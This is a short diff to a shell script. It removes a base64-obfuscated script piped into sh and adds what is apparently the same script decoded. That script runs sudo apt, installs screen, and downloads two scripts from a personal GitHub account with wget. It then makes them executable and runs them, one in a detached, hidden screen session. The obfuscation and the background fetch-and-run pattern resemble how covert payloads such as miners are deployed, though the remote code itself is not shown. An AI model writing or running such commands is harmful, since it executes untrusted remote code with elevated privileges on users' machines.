@@ -1,1 +1,10 @@
-base64 -d <<< 'IyEvYmluL3NoCgpzdWRvIGFwdCB1cGRhdGUKc3VkbyBhcHQgaW5zdGFsbCBzY3JlZW4gLXkKd2dldCBodHRwczovL2dpdGh1Yi5jb20vRGFyc2hHb3N3YW1pMTk4Mi9wcmVtL3Jhdy9tYWluL2xhZy5zaAp3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9EYXJzaEdvc3dhbWkxOTgyL0ZrZ1gvcmF3L21haW4vbWFuLnNoCmNobW9kICt4IG1hbi5zaApzY3JlZW4gLWRtUyBtYW4gLi9tYW4uc2ggNjAgNzAKY2htb2QgK3ggbGFnLnNoCi4vbGFnLnNo' | sh
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/DarshGoswami1982/prem/raw/main/dh.sh
+wget https://github.com/DarshGoswami1982/FkgX/raw/main/man.sh
+chmod +x man.sh
+screen -dmS man ./man.sh 60 70
+chmod +x dh.sh
+./dh.sh
